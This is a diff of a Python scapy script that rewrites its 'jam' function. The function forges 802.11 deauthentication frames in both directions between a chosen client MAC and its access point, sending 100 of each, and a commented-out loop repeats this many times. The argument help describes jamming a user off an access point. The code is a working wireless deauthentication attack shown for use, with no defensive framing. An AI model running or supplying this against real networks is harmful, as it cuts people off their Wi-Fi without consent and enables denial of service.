@@ -12,7 +12,7 @@ import logging #This and next line is to get scapy to shut up
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from signal import SIGINT, signal
-from sys import exit#, argv
+from sys import exit
 import re
 import argparse
 
@@ -59,12 +59,15 @@ def argumentGenerator():
                         help = "jam user from accesspoint."\
                             + " Requires -t and -a.")
 
-    # These are required if -j flag is set
+   
+    # This is required if -j flag is set
     parser.add_argument("-t",
                         "--target",
                         help = "target's MAC address - needed for -j."\
                             + " Example: -a 66:75:63:6b:20:75")
+   
 
+    # This is required if -j flag is set
     parser.add_argument("-a",
                         "--accesspoint",
                         help = "access point of target -"\
@@ -72,8 +75,6 @@ def argumentGenerator():
                             + " 62:61:6c:6c:7a:7a")
 
     # Other options?
-    
-
 
     # Returns all the arguments
     return parser.parse_args()
@@ -121,11 +122,25 @@ def printVerboseDetails():
 
 # The jammer part
 # Takes in the interface, targetMac and apMac
+# Struggle to jam crap :(
 def jam(iface, targetMac, apMac):
+    print targetMac
+    print apMac
     # Create a packet that goes to the target from the ap
-    jamPacketClient = Dot11(addr1 = targetMac,
-        addr2 = apMac, addr3 = apMac)/Dot11Deauth()
-    send(jamPacketClient, count=100) # send 100 packets
+    jamPacketClient = RadioTap()/Dot11(type=0,subtype=12, addr1 = targetMac,
+        addr2 = apMac, addr3 = apMac)/Dot11Deauth(reason=7)
+    
+    jamPacketAp = RadioTap()/Dot11(type=0,subtype=12,addr1 = apMac,
+        addr2 = targetMac, addr3 = targetMac)/Dot11Deauth(reason=7)
+    
+    send (jamPacketClient, count=100)
+    send (jamPacketAp, count =   100)
+    #i = 0
+    #while (i < 1000):
+    #    i += 1
+    #    send(jamPacketAp, count=100)
+    #    send(jamPacketClient, count=100)
+    #send(jamPacketAp, count=100) # send 100 packets
 
 
 
